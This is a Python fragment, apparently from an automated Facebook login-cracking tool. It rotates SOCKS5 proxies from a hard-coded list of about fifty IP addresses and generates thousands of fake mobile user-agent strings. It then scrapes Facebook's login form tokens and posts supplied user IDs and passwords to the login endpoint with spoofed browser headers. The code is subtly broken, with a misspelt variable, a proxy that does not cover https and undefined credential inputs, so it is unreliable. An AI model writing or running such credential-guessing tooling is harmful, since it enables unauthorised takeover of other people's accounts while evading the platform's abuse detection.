_rs = requests.Session()

###__//@Socks5 Proxys
proxys = random.choice([
    "91.200.115.49:1080",
    "203.76.110.186:4145",
    "66.94.99.169:60993",
    "74.119.147.209:4145",
    "67.213.210.167:32928",
    "46.8.221.15:1080",
    "162.241.76.102:51388",
    "67.213.212.54:40514",
    "50.63.12.101:46403",
    "116.107.190.2:1080",
    "190.184.144.222:5678",
    "103.4.145.133:1080",
    "162.210.192.136:55440",
    "54.37.78.53:27606",
    "217.197.151.182:5678",
    "212.5.132.74:5678",
    "54.37.11.28:51676",
    "103.88.169.106:33149",
    "134.209.106.70:52307",
    "182.16.171.42:51459",
    "118.179.198.226:1088",
    "192.158.15.201:50877",
    "41.164.247.154:1088",
    "154.38.161.76:42543",
    "103.204.55.221:1080",
    "184.178.172.13:15311",
    "181.129.198.58:5678",
    "157.245.131.28:33545",
    "5.9.43.92:17818",
    "27.77.228.138:1080",
    "103.68.3.114:4145",
    "193.233.22.13:1080",
    "162.241.77.69:51388",
    "142.166.131.50:5678",
    "46.101.111.181:60090",
    "81.16.9.222:3629",
    "202.154.36.103:1080",
    "178.62.69.186:61322",
    "199.229.254.129:4145",
    "177.234.192.45:32213",
    "117.74.125.210:1133",
    "51.91.56.222:44700",
    "51.77.92.155:55448",
    "103.148.210.202:1080",
    "175.139.200.17:4153",
    "80.191.40.40:5678",
    "182.53.216.73:4145",
    "217.145.199.47:56746",
    "90.156.142.57:29518",
    "176.124.199.114:1080"
])

###__//@iphone user-agents
usragt=[]
for xd in range(10000):
	a='Mozilla/5.0 (iPhone;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='CPU iPhone OS 18_0 like Mac OS X)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile/15E148 Safari/604.1'
	my_time=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	usragt.append(my_time)


	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' iPhone 13 Pro Max)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	my_time=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	usragt.append(my_time)

###__//@Fb Web Method
user_agnet = random.choice(usragt)
proxy = {'http': f'socks5://{proxys}'}
get_url = _rs.get('https://web.facebook.com/?locale2=in_NP&_rdc=1&_rdr')
data = {"lsd":re.search('name="lsd" value="(.*?)"', str(get_url.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(get_url.text)).group(1),"uid":idr,"next":"https://web.prod.facebook.com/login/save-device/","flow":"login_no_pin","pass":pdr,}
headers = {
'authority': 'web.facebook.com',
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'accept-language': 'in-NP,in;q=0.9,en-US;q=0.8,en;q=0.7',
'cache-control': 'max-age=0',
'content-type': 'application/x-www-form-urlencoded',
'origin': 'https://web.facebook.com',
'referer': 'https://web.facebook.com/?locale2=id_ID&_rdc=1&_rdr',
'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'document',
'sec-fetch-mode': 'navigate',
'sec-fetch-site': 'same-origin',
'sec-fetch-user': '?1',
'upgrade-insecure-requests': '1',
'user-agent': user_agent,
}
get_coki = (";").join([ "%s=%s" % (key, value) for key, value in get_url.cookies.get_dict().items() ]);get_coki+=' m_pixel_ratio=2.625; wd=412x756'
req_post = _rs.post('https://web.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzMzMjY5NzI3LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next',data=data,cookies={'cookie': get_coki},headers=headers,allow_redirects=False,proxies=proxy)

